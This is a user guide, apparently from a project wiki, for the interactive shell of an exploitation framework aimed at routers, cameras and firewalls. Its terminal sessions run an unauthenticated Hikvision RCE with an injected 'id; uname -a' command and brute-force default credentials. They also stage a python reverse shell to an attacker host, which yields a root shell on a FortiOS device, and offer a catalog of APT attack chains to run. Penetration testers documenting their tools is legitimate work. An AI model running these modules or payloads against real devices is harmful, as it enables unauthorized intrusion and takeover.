# Interactive Shell Commands

**Language:** English (en-US) | **pt-BR:** [../pt-BR/02-shell-interativo-comandos.md](../pt-BR/02-shell-interativo-comandos.md)

---

## Starting the shell

```bash
embedxpl           # recommended (after pip install embedxpl)
exf                # alias — identical behavior
fxf                # alias — identical behavior
python -m embedxpl # module invocation
python exf.py      # legacy bootstrap (from git clone root)
```

The shell prints the banner and enters a REPL loop:

```text
$ exf

  ____  __  __ _____
 |  _ \ \ \/ /|  ___|   EmbedXPL-Forge v1.0.0
 | |_) | \  / | |_      Network Device Security Assessment Framework
 |  _ <  /  \ |  _|
 |_| \_\/_/\_\|_|        Author: Andre Henrique (@mrhenrike) | Uniao Geek

 Target scope: Routers - Switches L2/L3 - IP Cameras - GPON ONTs - ISP CPEs - IoT/Embedded Edge

 [modules] 2807 total -- Exploits: 1842 | Scanners: 134 | Creds: 687 | Generic: 22 | Payloads: 32 | Encoders: 13
 [system]  Intel Core i7-12700H | 16 cores | 32 GB RAM | NVIDIA RTX 3060 6 GB | compute: auto

exf >
```

---

## Prompt format

| State | Prompt |
|-------|--------|
| No module loaded | `exf > ` (underlined in terminal) |
| Module loaded | `exf (ModuleName) > ` (module name in red/bright) |

```text
exf >                              # global state
exf (Hikvision Unauthenticated RCE) >   # module loaded
exf (AutoPwn) >                    # scanner module loaded
```

The prompt templates can be customized via environment variables:
- `EXF_RAW_PROMPT` — prompt when no module is active (must contain `{host}`)
- `EXF_MODULE_PROMPT` — prompt when a module is active (must contain `{host}` and `{module}`)

---

## Tab completion

Tab completion is enabled for all commands and module paths. Press `Tab` once for completion, twice to list all options:

```text
exf > use exploits/cameras/hi[TAB]
exploits/cameras/hikvision/

exf > use exploits/cameras/hikvision/[TAB][TAB]
info_disclosure_cve_2017_7921
rtsp_rce_cve_2021_36260
firmware_crypto_key_extract
...
```

---

## Command overview

### Global commands (always available)

| Command | Syntax | Description |
|---------|--------|-------------|
| `help` | `help` | Print the global and module help menus |
| `use` | `use <module_path>` | Load a module from the module arsenal |
| `search` | `search [term] [filters]` | Search for modules by keyword, CVE, or filter |
| `show` | `show <subcommand>` | Display listings — see subcommands below |
| `exec` | `exec <shell_command>` | Execute an OS shell command via `os.system()` |
| `sysinfo` | `sysinfo` | Display detailed CPU, RAM, GPU, compute mode |
| `compute` | `compute <mode>` | Set compute backend (`cpu`, `gpu`, `hybrid`, `auto`) |
| `discover` | `discover <subnet/CIDR>` | Network discovery, fingerprinting, module matching |
| `sessions` | `sessions [subcommand]` | Manage persistent per-host scan sessions |
| `apt` | `apt [subcommand]` | APT (nation-state) attack chain catalog |
| `exit` | `exit` | Quit the shell (also Ctrl+D) |

### Module-context commands (require a module loaded via `use`)

| Command | Syntax | Description |
|---------|--------|-------------|
| `run` | `run` | Execute the loaded module |
| `exploit` | `exploit` | Alias for `run` |
| `check` | `check` | Run the module vulnerability check only |
| `set` | `set <option> <value>` | Set a module option |
| `setg` | `setg <option> <value>` | Set a global option (persists across all modules) |
| `unsetg` | `unsetg <option>` | Clear a previously set global option |
| `show options` | `show options` | List non-advanced module options with current values |
| `show advanced` | `show advanced` | List all options including advanced ones |
| `show info` | `show info` | Display module metadata (name, description, authors, devices, references) |
| `show devices` | `show devices` | List exact device models/firmware targeted by this module |
| `show wordlists` | `show wordlists` | List bundled wordlists available to the module |
| `show encoders` | `show encoders` | List encoders available (payload modules only) |
| `back` | `back` | Unload the current module, return to global state |

---

## `help` — print help

```
help
```

**Syntax:**

```text
help
```

**Parameters:** none.

**Terminal session:**

```text
exf > help

Global commands:
    help                        Print this help menu
    use <module>                Select a module for usage
    exec <shell command> <args> Execute a command in a shell
    search <search term>        Search for appropriate module
    sysinfo                     Show detected hardware (CPU, RAM, GPU)
    compute <cpu|gpu|hybrid|auto>  Set compute mode for ML/GPU operations
    discover <subnet/CIDR>      Scan network and match targets to exploit catalog
    discover -T <targets.txt>   Scan multiple IPs/CIDRs listed in a file (one per line)
    sessions [list|show|delete|purge|export]  Manage scan session history
    exit                        Exit EmbedXPL

Module commands:
    run                                 Run the selected module with the given options
    back                                De-select the current module
    set <option name> <option value>    Set an option for the selected module
    setg <option name> <option value>   Set an option for all of the modules
    unsetg <option name>                Unset option that was set globally
    show [info|options|devices]         Print information, options, or target devices for a module
    check                               Check if a given target is vulnerable to a selected module's exploit

exf >
```

**Notes:**
- `help` is available in both global and module-context states.
- When a module is loaded, both sections are printed.

---

## `use` — load a module

```
use <module_path>
```

**Parameters:**

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `module_path` | string | Yes | — | Any valid module path | Slash-separated path relative to `embedxpl/modules/`. Dots or slashes both work. |

**Terminal session — loading an exploit:**

```text
exf > use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
exf (Hikvision Unauthenticated RCE) >
```

**Terminal session — loading a credential module:**

```text
exf > use creds/routers/dlink/telnet_default_creds
exf (telnet_default_creds) >
```

**Terminal session — loading a scanner:**

```text
exf > use scanners/autopwn
exf (AutoPwn) >
```

**Terminal session — loading a payload:**

```text
exf > use payloads/python/reverse_tcp
exf (python/reverse_tcp) >
```

**Terminal session — module not found:**

```text
exf > use exploits/cameras/hikvision/does_not_exist
[-] ImportError: No module named 'embedxpl.modules.exploits.cameras.hikvision.does_not_exist'
exf >
```

**Notes:**
- Paths use forward slashes (`/`) or dots (`.`) interchangeably.
- Tab completion is available after each path segment.
- When a module is loaded, any previously set global options (`setg`) are automatically applied to matching option names.

---

## `set` — set a module option

```
set <option_name> <value>
```

**Parameters:**

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `option_name` | string | Yes | — | Any option defined by the module | Option to configure |
| `value` | string | Yes | — | Depends on option type | New value for the option |

**Option data types:**

| Type | Shell input format | Example |
|------|--------------------|---------|
| `OptIP` | IPv4, IPv6, hostname, or `file://path` | `192.168.1.1`, `file:///tmp/hosts.txt` |
| `OptPort` | Integer 1–65535 | `443`, `9100` |
| `OptBool` | `true` or `false` (case-insensitive) | `true`, `false` |
| `OptString` | Any string value | `admin`, `id`, `whoami` |
| `OptInteger` | Decimal or hex integer | `10`, `0x1F` |
| `OptFloat` | Floating-point number | `2.0`, `0.5` |
| `OptMAC` | MAC address | `aa:bb:cc:dd:ee:ff` |
| `OptWordlist` | `file://path` or `user:pass,...` | `file:///usr/share/wordlists/rockyou.txt` |

**Terminal session:**

```text
exf > use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
exf (Hikvision Unauthenticated RCE) > set target 192.168.1.100
[+] target => 192.168.1.100
exf (Hikvision Unauthenticated RCE) > set port 80
[+] port => 80
exf (Hikvision Unauthenticated RCE) > set ssl false
[+] ssl => false
exf (Hikvision Unauthenticated RCE) > set command "id; uname -a"
[+] command => id; uname -a
```

**Error case — invalid option name:**

```text
exf (Hikvision Unauthenticated RCE) > set nonexistent_option foo
[-] You can't set option 'nonexistent_option'.
    Available options: ['target', 'port', 'ssl', 'command']
```

---

## `setg` — set a global option

```
setg <option_name> <value>
```

**Parameters:** same as `set`.

**Description:** Sets an option that persists in the `GLOBAL_OPTS` dictionary. When any new module is loaded with `use`, global options whose names match the module's options are applied automatically.

**Terminal session:**

```text
exf > use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
exf (Hikvision Unauthenticated RCE) > setg target 192.168.1.100
[+] target => 192.168.1.100

exf (Hikvision Unauthenticated RCE) > back
exf > use exploits/cameras/dahua/cctv_rce_cve_2021_36260
exf (Dahua RCE CVE-2021-36260 (DAHUA-2026-006)) >
# target 192.168.1.100 is automatically applied from GLOBAL_OPTS
```

**Notes:**
- Global options do not override options explicitly set with `set` after loading a module.
- Use `unsetg` to clear a global option.

---

## `unsetg` — clear a global option

```
unsetg <option_name>
```

**Parameters:**

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `option_name` | string | Yes | — | Any key in `GLOBAL_OPTS` | Name of the global option to remove |

**Terminal session (success):**

```text
exf (Hikvision Unauthenticated RCE) > unsetg target
[+] {'target': '192.168.1.100'}
```

**Terminal session (option not in globals):**

```text
exf (Hikvision Unauthenticated RCE) > unsetg port
[-] You can't unset global option 'port'.
    Available global options: ['target']
```

---

## `back` — unload current module

```
back
```

**Parameters:** none.

**Terminal session:**

```text
exf (Hikvision Unauthenticated RCE) > back
exf >
```

**Notes:**
- `back` does not clear global options set with `setg`.
- Module options set with `set` (local to the module) are discarded when you `back`.

---

## `run` / `exploit` — execute a module

```
run
exploit
```

**Parameters:** none (options are set beforehand with `set`).

**Terminal session — exploit module execution:**

```text
exf > use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
exf (Hikvision Unauthenticated RCE) > set target 192.168.1.100
[+] target => 192.168.1.100
exf (Hikvision Unauthenticated RCE) > set port 80
[+] port => 80
exf (Hikvision Unauthenticated RCE) > run
[*] Running module <embedxpl.modules.exploits.cameras.hikvision.rtsp_rce_cve_2021_36260.Exploit object>...
[*] Checking if 192.168.1.100:80 is a Hikvision device...
[*] Attempting CVE-2021-36260 RCE on 192.168.1.100...
[*] Response HTTP 400: <?xml version="1.0" encoding="UTF-8"?><ResponseStatus ...>
[+] CVE-2021-36260: Payload delivered to 192.168.1.100:80. Monitor for callback.
[!] Verify execution via OOB (e.g., Burp Collaborator or Interactsh).
exf (Hikvision Unauthenticated RCE) >
```

**Terminal session — cancelled with Ctrl+C:**

```text
exf (AutoPwn) > run
[*] AutoPwn timing profiles (Nmap-style -T0..-T5):
...
^C
[*]
[-] Operation cancelled by user
exf (AutoPwn) >
```

**Terminal session — module raises exception:**

```text
exf (Hikvision Unauthenticated RCE) > run
[*] Running module ...
[-] Traceback (most recent call last):
  File "embedxpl/modules/exploits/cameras/hikvision/rtsp_rce_cve_2021_36260.py", line 72, in run
    resp = self.http_request(...)
  ...
ConnectionRefusedError: [Errno 111] Connection refused
exf (Hikvision Unauthenticated RCE) >
```

**Notes:**
- `exploit` is a full alias for `run`; they call the same internal method.
- Results are automatically saved to `~/.exf_sessions/` if `target` is set.
- Press Ctrl+C to cancel a running module. Ctrl+D exits the shell.
- If the module defines `_enforce_hardware_gate()`, it is called before `run()` to verify compute mode.

---

## `check` — verify vulnerability only

```
check
```

**Parameters:** none.

**Description:** Calls the module's `check()` method without calling `run()`. Useful for mass vulnerability scanning without triggering exploitation payloads.

**Return values:**

| `check()` return | Shell output |
|------------------|--------------|
| `True` | `[+] Target is vulnerable` |
| `False` | `[-] Target is not vulnerable` |
| Exception / None | `[*] Target could not be verified` |

**Terminal session (vulnerable):**

```text
exf > use exploits/cameras/dahua/cctv_rce_cve_2021_36260
exf (Dahua RCE CVE-2021-36260 (DAHUA-2026-006)) > set target 192.168.1.50
[+] target => 192.168.1.50
exf (Dahua RCE CVE-2021-36260 (DAHUA-2026-006)) > check
[+] Target is vulnerable
```

**Terminal session (not vulnerable):**

```text
exf (Dahua RCE CVE-2021-36260 (DAHUA-2026-006)) > check
[-] Target is not vulnerable
```

**Terminal session (inconclusive):**

```text
exf (Dahua RCE CVE-2021-36260 (DAHUA-2026-006)) > check
[*] Target could not be verified
```

**Notes:**
- Not all modules implement `check()`. For those that do not, `check` will call a base-class stub that always returns `None`, yielding "could not be verified".
- `check` results are recorded to the session for the target host.

---

## `show` — display module/system information

```
show <subcommand>
```

**Parameters:**

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `subcommand` | string | Yes | — | See table below | What to display |

**Available subcommands:**

| Subcommand | Requires module | Description |
|------------|-----------------|-------------|
| `info` | Yes | Module metadata: name, description, devices, authors, references |
| `options` | Yes | Non-advanced option table: name, current value, description |
| `advanced` | Yes | Full option table including advanced options |
| `devices` | Yes | Target device models/firmware/brands for the loaded module |
| `wordlists` | Yes | Bundled wordlists available in the wordlists directory |
| `encoders` | Yes | Available encoders (for payload modules) |
| `all` | No | All module paths from all categories |
| `exploits` | No | All exploit module paths |
| `scanners` | No | All scanner module paths |
| `creds` | No | All credential module paths |

**Terminal session — `show info`:**

```text
exf > use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
exf (Hikvision Unauthenticated RCE) > show info

[*] Name:        Hikvision Unauthenticated RCE
[*] Description: CVE-2021-36260 — Hikvision IP cameras allow remote code execution
                 without authentication via crafted HTTP PUT to /SDK/webLanguage.
                 The command is injected via the lang parameter, executing as root.
[*] Devices:     Hikvision IP Cameras (DS-2CD series, DS-2DE series, etc.)
                 Hikvision NVR/DVR with web interface
[*] Authors:     watchTowr Labs (original)
                 André Henrique (@mrhenrike) - EmbedXPL-Forge port
[*] References:  https://nvd.nist.gov/vuln/detail/CVE-2021-36260
                 https://www.exploit-db.com/exploits/50441

exf (Hikvision Unauthenticated RCE) >
```

**Terminal session — `show options`:**

```text
exf (Hikvision Unauthenticated RCE) > show options

Target options:
┌────────┬──────────────────┬──────────────────────────────────────┐
│ Name   │ Current settings │ Description                          │
├────────┼──────────────────┼──────────────────────────────────────┤
│ target │                  │ Target IPv4 address                  │
│ port   │ 80               │ HTTP port (80 or 443)                │
│ ssl    │ False            │ Use HTTPS                            │
└────────┴──────────────────┴──────────────────────────────────────┘

Module options:
┌─────────┬──────────────────┬───────────────────────────────────────┐
│ Name    │ Current settings │ Description                           │
├─────────┼──────────────────┼───────────────────────────────────────┤
│ command │ id               │ Command to execute (default: id)      │
└─────────┴──────────────────┴───────────────────────────────────────┘

exf (Hikvision Unauthenticated RCE) >
```

**Terminal session — `show devices`:**

```text
exf (Hikvision Unauthenticated RCE) > show devices

Target devices:
   0 - Hikvision IP Cameras (DS-2CD series, DS-2DE series, etc.)
   1 - Hikvision NVR/DVR with web interface

exf (Hikvision Unauthenticated RCE) >
```

**Terminal session — `show wordlists` (on a creds module):**

```text
exf > use creds/routers/dlink/telnet_default_creds
exf (telnet_default_creds) > show wordlists

┌────────────────────┬──────────────────────────────────────────────────────────────┐
│ Wordlist           │ Path                                                         │
├────────────────────┼──────────────────────────────────────────────────────────────┤
│ dlink_defaults.txt │ file:///home/user/.venv/lib/python3.11/site-packages/embed.. │
└────────────────────┴──────────────────────────────────────────────────────────────┘
```

**Terminal session — `show encoders` (on a payload module):**

```text
exf > use payloads/python/reverse_tcp
exf (python/reverse_tcp) > show encoders

┌───────────────┬──────────────────────────────┬──────────────────────────────────────┐
│ Encoder       │ Name                         │ Description                          │
├───────────────┼──────────────────────────────┼──────────────────────────────────────┤
│ base64        │ Python Base64 Encoder        │ Encode payload as Python base64 exec │
│ hex           │ Python Hex Encoder           │ Encode payload as Python hex exec    │
└───────────────┴──────────────────────────────┴──────────────────────────────────────┘
```

**Terminal session — `show all` (truncated):**

```text
exf > show all
exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
exploits/cameras/hikvision/info_disclosure_cve_2017_7921
exploits/cameras/dahua/cctv_rce_cve_2021_36260
exploits/cameras/dahua/auth_bypass_cve_2021_33044
...
creds/routers/dlink/telnet_default_creds
creds/cameras/hikvision/webinterface_http_auth_default_creds
...
scanners/autopwn
scanners/cameras/herospeed_longsee_nvr_scan
...
```

**Error case — unknown subcommand:**

```text
exf > show unknown_sub
[-] Unknown 'show' sub-command 'unknown_sub'.
    What do you want to show?
    Possible choices are: ('info', 'options', 'advanced', 'devices', 'all', 'encoders', 'creds', 'exploits', 'scanners', 'wordlists')
```

---

## `sysinfo` — hardware profile

See [01-introduction-and-installation.md](01-introduction-and-installation.md#sysinfo--hardware-profile) for full output examples.

```text
exf > sysinfo
```

Displays CPU model/arch/cores/threads/frequency, RAM total/available, GPU table (name, VRAM, backend, driver, compute capability), and current compute mode.

---

## `compute` — set compute mode

```
compute <mode>
```

**Parameters:**

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `mode` | string | Yes | `auto` | `cpu`, `gpu`, `hybrid`, `auto` | Compute backend to use |

**Terminal session:**

```text
exf > compute auto
[+] compute_mode => auto
    auto resolves to: hybrid

exf > compute cpu
[+] compute_mode => cpu

exf > compute gpu
[+] compute_mode => gpu
```

**Error case — invalid mode:**

```text
exf > compute turbo
[-] Invalid compute mode 'turbo'. Choose from: cpu, gpu, hybrid, auto
```

**Error case — GPU requested but not present:**

```text
exf > compute gpu
[!] No GPU detected -- falling back to compute_mode=cpu
```

---

## `exec` — run OS shell commands

```
exec <shell_command>
```

**Parameters:**

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `shell_command` | string | Yes | — | Any valid OS command | Command passed to `os.system()` |

**Terminal session:**

```text
exf > exec whoami
mrhenrike

exf > exec nmap -sV 192.168.1.1 -p 80,443,23
Starting Nmap 7.95 ...
PORT    STATE SERVICE VERSION
80/tcp  open  http    lighttpd
443/tcp open  https
23/tcp  open  telnet

exf > exec cat /etc/hosts
127.0.0.1   localhost
```

**Notes:**
- Output goes directly to stdout. `exec` uses `os.system()`, not a subprocess with captured output.
- To capture output in a file: `exec nmap 192.168.1.1 > /tmp/scan.txt`
- On Windows, commands use `cmd.exe` semantics.

---

## `discover` — network discovery

```
discover <subnet/CIDR>
discover <subnet/CIDR> --fresh
discover -T <targets_file>
discover -T <targets_file> --fresh
```

**Parameters:**

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `subnet/CIDR` | string | Yes* | — | IP address or CIDR notation | Target to scan |
| `--fresh` | flag | No | — | — | Ignore session cache, force full rescan |
| `-T` | flag + path | No* | — | File path | Scan IPs/CIDRs listed in file (one per line) |

\* Either `subnet/CIDR` or `-T file` is required.

**Terminal session — CIDR scan:**

```text
exf > discover 192.168.1.0/24

[*] [scanning] Starting ARP/ICMP sweep
[*] [arp] 192.168.1.1 responding (Huawei)
[*] [fingerprint] Probing open ports on 192.168.1.1...
[*] [banner] Port 80: Server: WebServer (lighttpd 1.4.65)
[*] [oui] 3c:a3:7e -> HUAWEI TECHNOLOGIES CO.,LTD
[*] [match] 192.168.1.1: matched 4 exploit modules

┌──────────────────────────────────────────────────────────────────────────────────────────┐
│                              Discovered Hosts (3)                                        │
├───────────────┬───────────────────┬──────────┬───────────┬────────┬────────┬────────┬───┤
│ IP            │ MAC               │ Hostname │ Ports     │ Vendor │ Model  │ Conf.  │...│
├───────────────┼───────────────────┼──────────┼───────────┼────────┼────────┼────────┼───┤
│ 192.168.1.1   │ 3c:a3:7e:aa:bb:cc │ HuaweiGW │ 80,443,23 │ Huawei │ EG8145 │ 78%    │...│
│ 192.168.1.50  │ 44:19:b6:xx:yy:zz │ -        │ 80,554    │ Hikvis.│ DS-2CD │ 91%    │...│
│ 192.168.1.200 │ cc:29:bd:11:22:33 │ ZTE_CPE  │ 80,23     │ ZTE    │ H168N  │ 65%    │...│
└───────────────┴───────────────────┴──────────┴───────────┴────────┴────────┴────────┴───┘

[+] 3 host(s) matched against the exploit catalog:
  192.168.1.1 [Huawei] EG8145 -- 4 exploit module(s)
    use exploits/routers/huawei/eg8145x6_csrf_static_token  [dim]pending[/dim]
    use exploits/routers/huawei/eg8145x6_info_disclosure     [dim]pending[/dim]
    use exploits/routers/huawei/hg8245_default_creds         [dim]pending[/dim]
    use exploits/routers/huawei/hg8245_config_dump           [dim]pending[/dim]
  192.168.1.50 [Hikvision] DS-2CD -- 6 exploit module(s)
    use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260   [dim]pending[/dim]
    use exploits/cameras/hikvision/info_disclosure_cve_2017_7921  [dim]pending[/dim]
    ...
```

**Terminal session — session resume (host previously scanned):**

```text
exf > discover 192.168.1.0/24

SESSION FOUND for 192.168.1.50 (44:19:b6:xx:yy:zz) — last scan: 2026-05-30 14:22, tested: 3, vulns: 1
  3 module(s) already tested, 3 pending — resuming from where it stopped
  Previous vulns:
    • exploits/cameras/hikvision/rtsp_rce_cve_2021_36260

1 host(s) resumed from session history, 2 new
Use 'discover 192.168.1.0/24 --fresh' to ignore history and rescan from zero
```

**Terminal session — no live hosts found:**

```text
exf > discover 10.200.0.0/24
[*] Starting network discovery on 10.200.0.0/24
[!] No live hosts found on 10.200.0.0/24
```

**Error cases:**

```text
exf > discover not-an-ip
[-] Invalid target: 'not-an-ip'. Use IP or CIDR notation.

exf > discover -T
[-] Usage: discover -T <targets.txt>
```

---

## `sessions` — manage scan history

```
sessions
sessions list
sessions show <ip>
sessions delete <ip>
sessions export <ip>
sessions purge
```

**Parameters:**

| Subcommand | Parameter | Description |
|------------|-----------|-------------|
| `list` | — | Show all saved sessions in a table |
| `show` | `<ip>` | Detailed view for a specific host |
| `delete` | `<ip>` | Delete session for a host |
| `export` | `<ip>` | Print session as JSON |
| `purge` | — | Delete ALL sessions (prompts for confirmation) |

**Terminal session — list:**

```text
exf > sessions list

┌────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                     Saved Sessions (3)                                         │
├───┬───────────────┬───────────────────┬────────┬────────┬──────┬────────┬──────┬───────────────┤
│ # │ IP            │ MAC               │ Vendor │ Model  │ Scans│ Tested │ Vulns│ Last Scan     │
├───┼───────────────┼───────────────────┼────────┼────────┼──────┼────────┼──────┼───────────────┤
│ 1 │ 192.168.1.1   │ 3c:a3:7e:aa:bb:cc │ Huawei │ EG8145 │ 2    │ 6      │ 0    │ 2026-05-31    │
│ 2 │ 192.168.1.50  │ 44:19:b6:xx:yy:zz │ Hikvis │ DS-2CD │ 1    │ 3      │ 1    │ 2026-05-30    │
│ 3 │ 192.168.1.200 │ cc:29:bd:11:22:33 │ ZTE    │ H168N  │ 1    │ 2      │ 0    │ 2026-05-29    │
└───┴───────────────┴───────────────────┴────────┴────────┴──────┴────────┴──────┴───────────────┘
Use 'sessions show <ip>' for details
```

**Terminal session — show:**

```text
exf > sessions show 192.168.1.50

╭──────────────────────────────────────── Session Detail ─────────────────────────────────────────╮
│ 192.168.1.50 (44:19:b6:xx:yy:zz)                                                                │
│ Vendor: Hikvision  Model: DS-2CD2143G2-I                                                        │
│ First seen: 2026-05-30 14:20  Last scan: 2026-05-30 14:22                                       │
│ Total scans: 1  Ports: 80,443,554,8000                                                          │
│ WiFi: No                                                                                        │
╰─────────────────────────────────────────────────────────────────────────────────────────────────╯

Module Execution Summary:
  Matched:  6
  Tested:   3
  Pending:  3
  Vuln:     1
  Safe:     2
  Errored:  0

Confirmed Vulnerabilities:
  • exploits/cameras/hikvision/rtsp_rce_cve_2021_36260

Pending Modules (not yet tested):
  • exploits/cameras/hikvision/info_disclosure_cve_2017_7921
  • exploits/cameras/hikvision/firmware_crypto_key_extract
  • exploits/cameras/hikvision/nas_auth_bypass_cve_2023_28808

Execution History (last 20):
┌───────────────────────────────────┬────────────┬───────────┬─────────┐
│ Module                            │ Result     │ Time      │ Elapsed │
├───────────────────────────────────┼────────────┼───────────┼─────────┤
│ rtsp_rce_cve_2021_36260           │ VULNERABLE │ 05-30 14:21│ 2.3s   │
│ info_disclosure_cve_2017_7921     │ safe       │ 05-30 14:20│ 1.1s   │
│ psh_challenge_predictor           │ safe       │ 05-30 14:22│ 0.8s   │
└───────────────────────────────────┴────────────┴───────────┴─────────┘
```

**Terminal session — purge (with confirmation):**

```text
exf > sessions purge
WARNING: This will delete ALL saved sessions!
Type 'yes' to confirm: yes
[+] Purged 3 session(s)

exf > sessions purge
WARNING: This will delete ALL saved sessions!
Type 'yes' to confirm: no
[*] Cancelled
```

---

## `apt` — APT attack chain catalog

```
apt
apt list
apt show <group_id>
apt search <keyword>
apt run <group_id>
apt run <group_id> <attack_index>
```

**Terminal session — list:**

```text
exf > apt list

┌────────────────────────────────────────────────────────────────────────────────────┐
│               APT Groups Targeting Network Devices (12)                            │
├──────────────┬────────────────┬──────────┬──────────────────────┬─────────┬───────┤
│ ID           │ Name           │ Country  │ Aliases              │ Attacks │ MITRE │
├──────────────┼────────────────┼──────────┼──────────────────────┼─────────┼───────┤
│ teamcnc-4    │ Team CNC-4     │ China    │ UNC215, APT41-sub... │ 5       │ G0096 │
│ lazarus-net  │ Lazarus Group  │ N. Korea │ Hidden Cobra, ZINC   │ 4       │ G0032 │
│ ...          │ ...            │ ...      │ ...                  │ ...     │ ...   │
└──────────────┴────────────────┴──────────┴──────────────────────┴─────────┴───────┘
Use 'apt show <group_id>' for details or 'apt run <group_id>' to execute
```

**Terminal session — show:**

```text
exf > apt show teamcnc-4

╭──────────────────────────── APT Profile: teamcnc-4 ────────────────────────────╮
│ Team CNC-4 (China)                                                              │
│ Nation-state group targeting network infrastructure (SOHO routers, firewalls)  │
╰─────────────────────────────────────────────────────────────────────────────────╯

┌───┬──────────────┬─────────────────────────────┬──────────────────┬────────────────────┬───────┬──────┐
│ # │ Phase        │ Attack                      │ CVEs             │ Modules            │Devices│ Auth │
├───┼──────────────┼─────────────────────────────┼──────────────────┼────────────────────┼───────┼──────┤
│ 0 │ recon        │ SOHO credential harvest     │ -                │ creds/routers/...  │ ...   │ No   │
│ 1 │ initial_acc  │ Router RCE via CVE-2024-... │ CVE-2024-36061   │ exploits/routers/..│ ...   │ No   │
│ 2 │ persistence  │ Config backdoor             │ -                │ generic/...        │ ...   │ Yes  │
└───┴──────────────┴─────────────────────────────┴──────────────────┴────────────────────┴───────┴──────┘
Use 'apt run teamcnc-4 [attack#]' to execute
```

---

## `exit` — quit the shell

```
exit
```

**Parameters:** none.

```text
exf > exit
[*]
[-] EmbedXPL stopped
$
```

**Notes:**
- Ctrl+D has the same effect.
- Ctrl+C inside a running module cancels the module but does not exit the shell.
- Use Ctrl+D to force-exit at any time.

---

## Output prefix conventions

All output lines use a consistent prefix/color scheme:

| Prefix | Color | Meaning |
|--------|-------|---------|
| `[+]` | Green | Success / positive finding / credential found / vulnerable |
| `[-]` | Red | Error / failure / not vulnerable |
| `[*]` | Blue | Status / progress update |
| `[!]` | Yellow | Warning (non-fatal) |
| (none) | White | Informational/neutral text |

---

## Shell Stager options (exploit modules with shell staging)

Exploit modules that support post-exploitation shell delivery expose these additional options:

| Option | Type | Default | Accepted values | Description |
|--------|------|---------|-----------------|-------------|
| `lhost` | `OptString` | `""` | Any IP | Attacker IP for reverse shell callback |
| `lport` | `OptPort` | `4444` | 1–65535 | Listener port for reverse shell |
| `shell_type` | `OptString` | `auto` | See list below | Shell/payload type |
| `force_exploit` | `OptBool` | `false` | `true`, `false` | Skip `check()` and run exploitation directly |
| `ask_on_fail` | `OptBool` | `true` | `true`, `false` | Prompt user if `check()` returns False |
| `pty_upgrade` | `OptBool` | `true` | `true`, `false` | Auto-send `python3 pty.spawn()` on shell connect |
| `listener_timeout` | `OptPort` | `60` | 1–65535 | Seconds to wait for reverse connection |

**Accepted `shell_type` values:**
`bash`, `nc`, `python`, `perl`, `ruby`, `php`, `awk`, `socat`, `powershell`, `powershell_b64`, `nc_bind`, `python_bind`, `meterpreter_linux`, `meterpreter_windows`, `meterpreter_php`, `php_webshell`, `aspx_webshell`, `auto`

**Terminal session with reverse shell:**

```text
exf > use exploits/firewalls/fortinet/fortios_auth_bypass_cve_2022_40684
exf (FortiOS Auth Bypass CVE-2022-40684) > set target 10.0.0.5
[+] target => 10.0.0.5
exf (FortiOS Auth Bypass CVE-2022-40684) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (FortiOS Auth Bypass CVE-2022-40684) > set lport 4444
[+] lport => 4444
exf (FortiOS Auth Bypass CVE-2022-40684) > set shell_type python
[+] shell_type => python
exf (FortiOS Auth Bypass CVE-2022-40684) > run
[*] Running module ...
[*] FortiOS at 10.0.0.5:443 -- auth bypass phase 1
[+] Bypass active with header variant
[*] Phase 2 - Configuration dump...
[+] Admin Accounts: {"results": [{"name": "admin", "type": "administrator"}]}
[*] Phase 5 - Shell staging (type: python)...
[*] Payload: python3 -c "import socket,subprocess,os;s=socket.socket(...)..."
[shell] Listening on 0.0.0.0:4444 (timeout 60s) -- PTY mode
[shell] Shell connected from 10.0.0.5:52241 -- entering PTY interaction
[shell] PTY shell active. Ctrl+] to detach, Ctrl+D to close.

$ whoami
root
$ id
uid=0(root) gid=0(root) groups=0(root)
$ uname -a
Linux fortigate 4.19.261 #1 SMP Thu Mar 10 00:00:00 UTC 2022 x86_64 GNU/Linux
```


[Wiki hub](../README.md)
